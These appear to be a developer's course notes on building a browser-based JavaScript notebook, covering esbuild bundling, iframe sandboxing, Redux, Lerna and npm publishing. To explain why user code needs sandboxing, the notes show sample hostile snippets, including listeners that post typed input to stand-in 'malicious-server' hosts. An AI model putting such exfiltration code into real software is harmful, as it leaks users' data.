npx create-react-app jbook-revise --template typescript
npm install --save-exact esbuild-wasm@0.8.27

# delete all files in src folder

touch index.tsx

npm start

## Transpiling

# A temporary step.
# copy the ./node_modules/esbuild-wasm/esbuild.wasm to ./public (~11MB)
cp ./node_modules/esbuild-wasm/esbuild.wasm ./public

# https://esbuild.github.io
# Refer above for the documentation on esbuild


## Bundling
# Create a plugin which hijacks the module retrieval process
    - Reach out to npm registry to get the link for modules
    - Fetch the modules

# View npm link from CLI
npm view react dist.tarball

# We use unpkg to open the tgz file that we download using the link
# https://unpkg.com
# A public CDN

## Fetch packages from unpkg.com
# Test with package https://unpkg.com/tiny-test-pkg@1.0.0/index.js

# We will add axios to fetch the file from unpkg
npm install axios

## Implement caching layer
# We are going to use indexedDB
# We are going to use localforage library

npm install localforage

# Split the pluging into two: one for creating url and second loading package
# We need to specify css loader for css files and jsx for rest
# We need to provide an output path for css loader
#
# Trick used: (A workaround)
# We take CSS contents and put them inside the javascript
# The limitations: advanced features like nested imports, url links etc not supported.

TBD (Verify):
Check and see if the outputFiles generated by esbuild now provide the css file.

# We need to escape CSS snippets.

## Load esbuild.wasm from the unpkg instead of putting it in public folder

# A simple eval function is inadequate as the asynchronous calls might happen later
# which might not be caught.

The problems with the user provided code:
 - It might throw errors
 - It might mutate dom
 - It might run malicious code provided by other user.

Examples of breaking code:
document.body.innerHTML = '';

axios.post('https://malicious-server.com', {
});

document.querySelector('input').addEventListener('change', (event) => {
    axios.post('malicious.server', {
        value: event.target.value
    });
});

## Addition of iframes to preview User Code
# We will create an iframe element inside our App component
# We can isolate the iframe element from rest of the application. This contains any
# damages to the main page

# The default settings allow communication between the parent frame and child frame.
# Use document.querySelector('iframe').contentWindow.b
# We need to sandbox an iframe. Use allow-scripts to see it in console.
# Use allow-same-origin to get direct access from parent
# <iframe title="userCode" sandbox="allow-script allow-same-origin" src="./test.html" />

# Create a local address jbook.local which resolves to 127.0.0.1
# So we will load the test.html using http://jbook.local:3000/test.html

## iframe Security: we will use sandbox="",
# We will use iframe with srcDocs
# There is a limitation:
# The users are not going to be able to use localStorage, cookies
#

## We package the generated script in html tag and pass it to iframe via srcDoc
const html = `
<script>
    ${code}
</script>
`

## Running unescaped code with a <script> ... </script> tag in it messes things.
# Some browsers restrict length of attribute srcDoc in case generated code is too long.
# Also the following code will break
console.log('<script></script>');
# The </script> tag matches with the <script> tag defined in the html definition.

## Indirect communication between parent and iframe window
# Create a listener in top level window:
window.addEventListener('message', (e) => console.log(e), false);

We put following code in the input window
parent.postMessage('hello there', '*'); // * specifies domains that can receive message
parent.postMessage('hello there', 'google.com'); // wouldn't work on http://localhost

The message is received at the parent.
# So we create an iframe and start listening for events from parent
# When we receive code we update
# So we avoid passing long code via srcDoc
# Also the code is shared as a string instead of an html snippet.

# The new way of getting the generated code in iframe and executing it is working
# Given below is the source of iframe passed via srcDoc to it.
    const html = `\
    <html>
    <head></head>
    <body>
        <div id="root"></div>
        <script>
            window.addEventListener('message', (event) => {
              eval(event.data);
            }, false);
        </script>
    </body>
    </html>
    `;

# Now we will try creating a react component and running it.
# We will use the div with id root for the same.

# When we enter the following react code in the input window
import React from 'react';
import ReactDOM from 'react-dom';

const App = () => <h1>Hi there!</h1>

ReactDOM.render(
  <App/>,
  document.querySelector('#root')
);

## It works !!!

## Error handling in input code
# We reset the iframe DOM before the next execution.
# This makes sure that we get saved from any errors caused by previous execution

## EagerBundling: supported with a flag

## Monaco Editor: need to use --legacy-peer-deps
npm install --save-exact @monaco-editor/react@3.7.5 --legacy-peer-deps

The open source options:
CodeMirror
Ace Editor
Monaco Editor
https://www.npmjs.com/package/@monaco-editor/react
Two options: Editor and Diff Editor
We are going to use Editor

# Install monaco-editor package just to view its type definitions
npm install  monaco-editor --legacy-peer-deps
# Need to set options in editor
# Need to support onChange kind of function in editor
# Add npm package prettier to our editor to add code formatter
npm install prettier @types/prettier --legacy-peer-deps

## Add styling in our project. we will use bulma
npm install bulmaswatch --legacy-peer-deps
In index.tsx add:
import 'bulmaswatch/superhero/bulmaswatch.min.css';

## To make monaco-jsx-highlighter and jscodeshift work we need to downgrade to react-scripts "4.0.1"
rm package-lock.json
rm -r node_modules
npm install --legacy-peer-deps

## JSX highlighting in Monaco Editor
npm install --save-exact monaco-jsx-highlighter@0.0.15 jscodeshift@0.11.0 @types/jscodeshift@0.7.2 --legacy-peer-deps

We create a src/types.d.ts and add following to override typescript error.
declare module 'monaco-jsx-highlighter';
We used the custom created syntax.css for the code

# We have refactored the code into Preview, CodeCell, bundler etc

## Add support for Resizable using react-resizable
npm install --save-exact react-resizable@3.0.4 @types/react-resizable@3.0.2 --legacy-peer-deps

## We have to handle errors in the asynchrnous calls
Three kinds of errors
i) Bundling error during bundling time
ii) Synchronous code error during runtime
iii) Asynchronous code error during runtime

TBDV: In Safari the event.error is null in the window.addEventListener

The build errors are displayed in the mainWindow in preview-error inside the preview-wrapper.
The runtime errors are dsiplayed in the iframe.


## Create a Markdown editor with preview window
npm install --save-exact @uiw/react-md-editor@2.1.1 --legacy-peer-deps
Support ViewMode and EditMode
Add event listener to body element to detect any click outside the component

# We have to fix the misplaced cursor problem. We can check using the # (...text)
The bulma css conflicts here as it modifies .title. So we have to prevent it.
Fix the vertical divider height. It is caused due to bulma css conflict.
Restyle the resize bar

## Redux with typescript
npm install --save-exact react-redux redux @types/react-redux redux-thunk@2.3.0 --legacy-peer-deps

# Use immer package for the state management. This reduces the boilerplate that we have to write
npm install immer
Test redux store manually

# Binding React with Redux. Show list of cells to user.
CellList, CellListItem
We can move cells up and down
We need to create a TypedSelector. We will use a new mystery hook.
Action Creator Helper. Less writing but a lot more obscurity.
We are going to use incremental move from local state in cells to redux based state.
Add action bar in the cells move-up, move-down, delete

We will use FontAwesome
npm install @fortawesome/fontawesome-free@5.15.1 --legacy-peer-deps

## Add Cell Component
This divides the existing components. It is a line containing buttons and is placed between two components.

## Bundles Reducer in the redux side
Bundle state is derived from Cells state, as bundled code is produced from the Cell content
Discussion around selectors to be used in asynchronous code or not.

# We have a blinking preview window.
The useMemo fixes it in useActions.js hook. We need to bind this only once.:
return useMemo(() => bindActionCreators(actionCreators, dispatch), [dispatch]);

## Added support for default code in the code cell. Not there in the tutorial
We make a bundle check and call createBundle first time. bundle is not added in dependency list to avoid render loop.
We suppress the warning by using // eslint-disable-next-line react-hooks/exhaustive-deps

# Add support for Loading progress spinner
# Styling of progress bar.
# Show progress bar only if expected to take a long time.

## Cumulative Code Execution
Access code like functions etc defined in previous cells
Join the prior cells into the subsequent code cells
We will create built in function like show or render to display a value in the preview pane.
# Add support to show detect and show a react component
# Avoid name collisions
# Make a change in esbuild setting to create _React.createElement instead of React.createElement.
            jsxFactory: '_React.createElement',
            jsxFragment: '_React.Fragment'
# show from previous cells not to be used in the subsequent cells
The show function is defined twice, once where it does nothing and then in the last cell we give it a proper definition
Create a hook for getting the cumulative code.

## Save the list of cells in a file, so that these can be saved and can be shared easily with others.

## Local NODE API
# We will have something like to serve the built app
npx jbook serve
# Save changes via Local Node API
# Load up the saved file containing the cells

# We could have created a local-api.js and created a new script in package.json call 'serve'
# Package based development
We are going to have following main packages
CLI
Local Express API
Public Express API (Not being built, can be built in future)
React App

# We will use a tool called Lerna CLI, a tool for managing a multi package project.
Other such tools: Yarn workspaces, NPM Workspaces, Bolt, Luigi
We are using Lerna version v3.22.1
npm install -g --save-exact lerna@3.22.1

We will rename the jbook-revise folder to local-client as it contains the react app.
We want to rename the container folder as jbook-revise.
We are going to create two other folders as cli, local-api
Hence the three folders would be local-client, local-api, cli.

lerna init
mv local-client packages

The goal of cli package to start local-api, but we can also use it for operations like publish etc.
cd packages
mkdir cli
mkdir local-api
cd cli
npm init -y
cd ..
cd local-api
npm init -y
cd ..

With lerna we do not manually npm install modules, we delegate all this stuff to lerna.
We will use lerna for all this.

# Example
lerna add <pkg> --scope=module-1

CLI
lerna add commander --scope=cli

# Linking packages locally: One of the main reasons for using lerna
lerna add local-api --scope=cli

# Adding typescript support
# Updated npx command for typescript
npx tsc --init

lerna add typescript --dev --scope=local-api
cd packages/local-api
npx tsc --init
# This creates tsconfig.json
Specify OutDir in the tsconfig.js
"outDir": "./dist",
"declaration": true,

Create target 'start' in package.json
"start": "tsc --watch --preserveWatchOutput"

cd packages/local-api
npm run start

Update in package.json
"main": "dist/index.js",
"types": "dist/index.d.ts"

Add typescript to CLI similarly.
lerna add typescript --dev --scope=cli

## Parallel start scripts
In root folder of project package.json. Following command will run start in each package

"start": "lerna run start --parallel"

npm run start

## CLI Implementation. We intend the user to run command like
'jbook serve'
'jbook serve notebook.js'
'jbook serve notebook.js -port 3050'

We will use a package named commander
cd packages/cli
cd src
mkdir commands
touch serve.ts

lerna add @types/node --dev --scope=cli

Terminal 1:
tsc --watch --preserveWatchOutput

Terminall 2:
node index.js serve file.js
node index.js serve file.js --port 4000

# Communication from CLI to API
The Local API has purpose of serving react app and persistence of cell i.e. save and fetch.

# From local API we are going to expose an API call serve(port, filename, dir)
We are going to export serve function from Local API

cd local-api
Export serve function from src/index.ts

cd cli
vi src/commands/serve.ts

cd packages/cli/dist
node index.js serve book.js --port=5000

What is the directory argument about.

## Implement the local-api
Goals of local api:
i) Serve react app
ii) Store cells in a file
iii) Retrieve cells from a file

Add dependencies and run express

With lerna we can add only one package at a time. (is it true still now?)
lerna add express --scope=local-api
lerna add @types/express --dev --scope=local-api
lerna add cors --scope=local-api
lerna add @types/cors --dev --scope=local-api
lerna add http-proxy-middleware --scope=local-api

# Create express app and run it via
jbook-revise/ $ cd packages/cli/dist
dist/ $ node index.js serve
Listening on port 4005

# Error handling for port in use
Wrap express listen with a promise in command serve
Also we have to resolve the problem as the error is thrown from asynchronous thread.
The command execution thread is long gone.
We will wrap the express call into a Promise.

## Load the built react files from the express app
In development mode: we are going to proxy to the React server in case the request is not for save/fetch cells.
We have installed http-proxy-middleware for the same.

# We are accessing the react app through the express app !!

# Second scenario:
Serve the react app from the build directory

Terminal 3:
cd packages/local-client
npm run build
Note: Due to markdown library, the production bundle creation might take a lot of time.
In our case it didn't!
The react production assets are built and kept inside build folder.

# Serve files from a directory in the express app:
We will use the Static Middleware
We will use the static-middleware to serve from local-client/build folder.

# Just for proof-of-concept
app.use(express.static('../../local-client/build'));
# The above is not a good solution. It was an approach used for demo purpose.
In lerna we can't reference files between different packages.
We are going to eventually deploy these in npm repository and the path provide to the middleware is not going to work.
The packages are going to be placed in the node_modules in a user's folder.

lerna add local-client --scope=local-api
This will create a link in the local-api/node_modules to local-client.
Now we will serve from the node_modules folder in the local-api which is allowed

We will try and use the following:
#Won't work: app.use(express.static('../node_modules/local-client/build'));
We will get the error:
Cannot GET /
It is because the local-client is a symbolic link.
We will take the symbolic link and we will resolve to absolute path.
const packagePath = require.resolve('local-client/build/index.html');
It works

Now we have two ways of serving the react-app
We will choose the way based on the environment.

# Detect Production mode (user's machine) and development mode (our local machine)
The user has downloaded and installed our application.
We can use process.env.NODE_ENV. But this can be easily modified by user.

# So we just before we deploy from the package we are going to run a small script
# The script will replace process.env.NODE_ENV with 'production'

The check works. In the developement the hot reloading doesn't work.

# Create the cells router
We want to intercept the requests for cells save and fetch.
cd local-api/src
mkdir routes
touch routes/cells.ts
Since we need the filename, we will wrap the router get and set in a function and we provide filename to that function

We will use the 'fs/promises' library for filesystem operations.

# Now we switch our focus back to the react application and support the fetch and save from the client side
We need to take a look at cellsReducer

## Redux logic for the cells save and fetch
action-types, actions, action-creators,
We import axios in the action-creators

For saveCells we only dispatch in case of error while saving. This is by choice.
We disable the manual population of the cells array.
Now we need to focus on the react part after doing the redux part.
We will place the fetch logic in the cells-list.tsx

# Error from the server
http://localhost:3000/cells not found
Problem: The cells api calls are reaching the proxy middleware and hence reaching the react application server as well.

We just need to change the order of router and proxy in the local-api app
# Note: Make sure that we use the http://localhost:4005 as shown in the result of node index.js serve command
Opened notebook.js. Navigate to http://localhost:4005
otherwise we will not get the result for api calls.
This could be avoided if we provide the API server address to the react app by hardcoding or by other means.

## Saving of cells via the API
We will save the cells whenever there is a change
The save part is tricky as we have to optimize the operations

redux middleware:
Persist Middleware in redux to make the API calls
If our middleware sees any of the Move, Update, Insert, Delete then middleware makes the API calls
cd local-client/src/state
mkdir middleware
touch persistMiddleware.ts

A redux middleware is a function that returns a function that returns a function.
Example redux middleware:
export const persistMiddleware = () => {
    return () => {
        return () => {

        }
    }
}

# Below is a non-intrusive working middleware. We have to make next(action) call.

export const persistMiddleware = ({dispatch}: {dispatch: Dispatch<Action>} ) => {
    return (next: (action:Action) => void) => {
        return (action: Action) => {
            next(action);
        }
    }
}

# The full implementation
export const persistMiddleware = (
    {dispatch, getState}: {dispatch: Dispatch<Action>, getState: () => RootState}
) => {
    return (next: (action:Action) => void) => {
        return (action: Action) => {
            next(action);

            if ([ActionType.MOVE_CELL,
                ActionType.UPDATE_CELL,
                ActionType.DELETE_CELL,
                ActionType.INSERT_CELL_AFTER
            ].includes(action.type)) {
                console.log(`We need to save cells.`);
                // The saveCells() returns a function which needs to be called with dispatch and getState
                saveCells()(dispatch, getState);
            }
        }
    }
}

# We will add a debounce so that we don't call API with every keypress

## Publishing to NPM
The packages cli, local-api, local-client have to be published to npm repo
The cli depends on local-api
The local-api depends on local-client
We want the user to install these using:
npm install -g jbook

# tiny-npm-deploy
Understand the process of deployment.
We will refer the already create project 'tiny-ball-deploy'

i) We need a unique package name
ii) publish the files in the "files": []
iii) Split dependencies and devDependencies. During publish only dependencies are needed.
Hence on somebody else's machine only dependencies are installed.
iv) Set package to be publically accessible. Add "publishConfig": {"access": "public"}
v) If building a CLI, which file to run. "bin" attribute "dist/index.js"
index.ts:
#!/usr/bin/env node
vi) Add a 'prePublish' script. To execute before publish.
"prepublishOnly": "npm run build"
vii) Commit to git. Use .gitignore as well.
viii) Run 'npm publish'
We got the email confirmation on neerajgupta.mbox@gmail.com

# We successfully uploaded two versions of tiny-ball-deploy 1.0.1 and 1.0.2
We can test using:
http://localhost:3005/
http://localhost:3005/demo (version 1.0.2 and above)

Scoped Packages: We will use the following package names
@glassball/cli
@glassball/local-api
@glassball/local-client

We will use the account neerajgupta.mbox@gmail.com on npm registry
We have four packages and one organization name.
We have the organization name glassball.

We will change the package names in the package.json of each of our packages
We need to refactor package name usages as we have renamed them
@glassball/cli:
package.json, serve.ts
@glassball/local-api
package.json, index.ts

We need to then run:
lerna bootstrap

i) Make sure package is unique
ii) Specify which files should be uploaded
iii) Split dependencies and devDependencies
iv) Set package to be fully accessible
v) If building a CLI, configure the file to run
vi) Add a 'prePublish' script
vii) Commit to git
viii) Run 'npm publish'

For cli, local-api
  "files": [
    "dist"
  ],
For local-client
  "files": [
    "build"
  ],

Note: For local-client we do not need any dependencies at all
The local-api uses the build folder in which everything is prebuilt

What is the purpose of "bin" attribute?
Put the following in all three:
  "publishConfig": {
    "access": "public"
  },

Remove the following from local-client
  "private": true,

# Now we need to add build scripts

# Add following
    #!/usr/bin/env node

# For cli and local-api
   "scripts" {
    "prepublishOnly": "tsc",
   }
# For local-client
       "scripts" {
        "prepublishOnly": "npm run build",
       }

# We will use the esbuild to create that script
# There is another goal, that user should install as little as possible to run @glassball/cli
We should apply esbuild to our cli package. We should also attempt to bundle our cli package
So it will have all the source code required for the cli

So with esbuild we do two things:
i) We replace process.env.NODE_ENV with production
ii) We bundle the cli package so that we do not have to download multiple packages.

lerna add esbuild@0.8.26 --exact --dev --scope=@glassball/cli
The local-client prepublishOnly command is:
"prepublishOnly": "esbuild src/index.ts --platform=node --outfile=dist/index.js --bundle --minify --define:process.env.NODE_ENV=\\\"production\\\" "

The couple of warnings are fine
The packaging is done. This means we do not need "@glassball/local-api", "commander" in the dependencies
We can move these to devDependencies

But when we do that we have to include the local-client package in the cli only, as it won't be done by local-api any more.
This is because local-api is not included now.
Nothing goes into the cli bundle from local-client
But local-client is needed because local-api code inside cli has to serve the build folder from local-client.

We will push these packages now to npm.
We will update the versions to 0.1.1

lerna publish --no-push

